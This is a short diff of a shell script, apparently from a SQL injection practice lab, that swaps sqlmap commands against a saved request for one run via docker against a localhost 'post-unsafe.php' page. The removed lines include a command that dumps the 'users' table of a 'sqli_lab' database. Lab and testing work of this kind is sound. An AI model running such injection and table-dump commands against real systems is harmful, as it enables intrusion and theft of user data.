@@ -1,4 +1,3 @@
-#!/usr/bin/env bash
-set -e
-sqlmap -r requests/unsafe-post.req -p keyword --batch
-sqlmap -r requests/unsafe-post.req -p keyword -D sqli_lab -T users --dump --batch
+#!/usr/bin/env sh
+set -eu
+docker compose run --rm sqlmap -u "http://localhost:8080/post-unsafe.php" --data "username=alice" --batch --level=2 --risk=1
